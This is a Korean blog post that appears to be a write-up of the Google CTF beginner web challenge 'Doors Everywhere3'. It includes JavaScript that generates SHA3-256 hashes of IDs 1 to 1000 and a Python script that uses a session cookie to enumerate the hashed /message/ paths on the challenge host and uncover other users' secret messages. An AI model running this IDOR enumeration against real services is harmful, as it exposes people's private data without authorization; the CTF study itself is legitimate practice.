---
layout: post
title: "Doors Everywhere3"
image: GR1.png
date: 2025-07-10 14:55:00 +0900
tags: [web, hacking]
categories: web
---

Google Beginner's Request

Doors Everywhere3

***

**Google Beginner's Request - Doors Everywhere3**

![]({{site.baseurl}}/images/GoogleRequest/DoorsEverywhere3/1.png)

Doors Everywhere3
비밀 메세지를 볼 수 없다고 설명하고 있다.

![]({{site.baseurl}}/images/GoogleRequest/DoorsEverywhere3/2.png)

![]({{site.baseurl}}/images/GoogleRequest/DoorsEverywhere3/3.png)


로그인 뒤 비밀 메세지 안에 개발자 도구를 확인하니
generateHash를 통해 비밀 ID를 해시값으로 변경 후 
그 값으로 Secret ID를 생성 하는 로직이며,
Secret ID를 Path로 입력 시 그 메세지를 확인할 수 있는 로직이다.

개발자 도구의 주석에서 뭐라고 적혀있긴 한데
번역기를 돌려놔서 그런지 잘 모르겠다;;

![]({{site.baseurl}}/images/GoogleRequest/DoorsEverywhere3/4.png)

어쨌든 generateHash에 들어가는 value값을 변경 시
Secret ID에 원하는 값이 나온다.

![]({{site.baseurl}}/images/GoogleRequest/DoorsEverywhere3/5.png)

1의 값을 generateHash로 변경 후 path에 입력 시
비밀 메세지의 예시가 나온다.

# 따라서

1~1000까지의 값들을 Hash로 변경 후
path에 대입하면 값이 나올 것이다.

***

1. 1~1000까지의 해시값 얻기

![]({{site.baseurl}}/images/GoogleRequest/DoorsEverywhere3/6.png)

1~1000까지의 값을 콘솔로 얻어낸다.

사용한 코드

{% highlight js %}
function generateHash(messageId) {
    const hashHex = sha3_256(messageId.toString());
    console.log(`ID: ${messageId} → Hash: ${hashHex}`);
}

// 1부터 1000까지 해시 생성
for (let i = 1; i <= 1000; i++) {
    generateHash(i);
}
{% endhighlight %}

2. python을 통해 값 얻어내기

얻어낸 1~1000까지의 값을 대입하여 본다.

존재하지 않는 값을 기준으로 잡고,
그 값의 text 길이와 동일하지 않다면 값을 출력하는 로직이다.

{% highlight js %}
import requests
import time
cookies = {
    'session': '[세션값]',
}
import warnings
warnings.filterwarnings('ignore')
headers = {
    'Host': 'secuweb-web.2024-bq.ctfcompetition.com',
    'Sec-Ch-Ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
    'Priority': 'u=0, i',
    # 'Cookie': 'session=.[세션값]',
}

a=["67b176705b46206614219f47a05aee7ae6a3edbe850bbbe214c536b989aea4d2",
"b1b1bd1ed240b1496c81ccf19ceccf2af6fd24fac10ae42023628abbe2687310",
...
"006e9d54d7ebe3029abf15866b51294ce3defb2bc2c27762570819f0959b250499"]

OriginResponse = requests.get(
    f'https://secuweb-web.2024-bq.ctfcompetition.com/message/1666',
    cookies=cookies,
    headers=headers,
    verify=False,
)

count = 0
for i in a:
    count+=1
    response = requests.get(
        f'https://secuweb-web.2024-bq.ctfcompetition.com/message/{i}',
        cookies=cookies,
        headers=headers,
        verify=False,
    )
    if len(OriginResponse.text) != len(response.text):
        print(response.text)
        print(count)
        print(i)

{% endhighlight %}

하다보면 이렇게 손으로 하는 건 아닌지 걱정도 해주고

![]({{site.baseurl}}/images/GoogleRequest/DoorsEverywhere3/7.png)

레고 세트 교환식도 한다.

![]({{site.baseurl}}/images/GoogleRequest/DoorsEverywhere3/8.png)

![]({{site.baseurl}}/images/GoogleRequest/DoorsEverywhere3/9.png)

여튼 Flag 획득

**시행착오**

1. PHP 내에 있는 기능을 python으로 옮겨오기가 힘들었다.